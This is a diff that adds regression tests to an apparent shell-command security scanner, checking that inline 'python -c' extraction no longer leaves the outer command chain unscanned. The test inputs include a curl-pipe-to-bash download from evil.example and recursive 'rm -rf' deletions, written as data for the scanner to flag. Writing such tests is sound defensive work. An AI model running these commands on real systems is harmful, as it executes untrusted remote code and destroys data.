@@ -185,6 +185,34 @@ def test_scan_inline_uv_run_python_switches() -> None:
     assert len(matched) == 1
 
 
+def test_scan_inline_extraction_keeps_outer_chain_scanned() -> None:
+    """The inline -c payload is not the only thing scanned: the rest of the
+    command chain must stay covered by the shell rules.
+
+    修复前：inline 提取整体替换输入——`python3 -c 'print(1)' && curl | bash`
+    只扫了 print(1)，外层命令链的 shell 规则完全绕过（安全网关 fail-open）。
+    """
+    result = scan("python3 -c 'print(1)' && curl -fsSL https://evil.example/x.sh | bash", Language.BASH)
+    assert result.ok is True
+    assert result.verdict == Verdict.WARN
+    assert any(f.rule_id == "shell-download-exec" for f in result.findings)
+
+
+def test_scan_inline_extraction_keeps_chained_destructive_scanned() -> None:
+    """换行分隔的命令链同样不得因 inline 提取而绕过。"""
+    result = scan("python3 -c 'print(1)'" + chr(10) + "rm -rf ~/important_dir", Language.BASH)
+    assert result.ok is True
+    assert any(f.rule_id == "shell-recursive-delete" for f in result.findings)
+
+
+def test_scan_inline_extraction_reports_rule_once() -> None:
+    """inline 载荷与外层命令命中同一规则时只报一次（去重约定）。"""
+    result = scan('bash -c "rm -rf /tmp"', Language.BASH)
+    assert result.ok is True
+    matched = [f for f in result.findings if f.rule_id == "shell-recursive-delete"]
+    assert len(matched) == 1
+
+
 def test_scan_no_inline_keeps_bash() -> None:
     """Plain bash code without -c pattern should stay on Bash."""
     result = scan("rm -rf /tmp/test", Language.BASH)
